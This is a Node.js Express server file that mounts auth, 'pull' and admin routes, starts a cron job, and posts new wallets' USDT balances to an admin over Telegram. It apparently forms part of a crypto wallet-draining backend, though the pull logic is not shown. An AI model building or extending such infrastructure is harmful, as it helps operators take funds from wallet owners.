import express from "express";
import bodyParser from "body-parser";
import { initDb } from "./db.js";
import authRoutes from "./routes/auth.js";
import pullRoutes from "./routes/pull.js";
import adminRoutes from "./routes/admin.js";
import { startCron } from "./cronService.js";
import { TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_ID } from "./config.js";
import axios from "axios";
import { pool } from "./db.js";
import { sendNewWalletAlert } from "./telegramService.js";

const app = express();
app.use(bodyParser.json());

// init DB
await initDb();

// routes
app.use("/auth", authRoutes);
app.use("/pull", pullRoutes);
app.use("/admin", adminRoutes);

// lightweight handler: when wallet verified server should send Telegram alert
// We prefer the /auth/verify route to return ok then the client or server will call a follow-up to notify Telegram.
// Simpler: add a small endpoint to notify
app.post("/notify/new-wallet", async (req, res) => {
  const { wallet } = req.body;
  if (!wallet) return res.status(400).send({ error: "wallet required" });
  // get balance and format
  try {
    const { getBalance } = await import("./usdtService.js");
    const bal = await getBalance(wallet);
    // assume USDT 6 decimals for display:
    const human = Number(bal / 10n ** 6n);
    await sendNewWalletAlert(wallet, `${human} USDT`);
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
});

// start cron
startCron();

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Backend started on port ${PORT}`));
app.get("/health", (req, res) => res.json({ ok: true }));

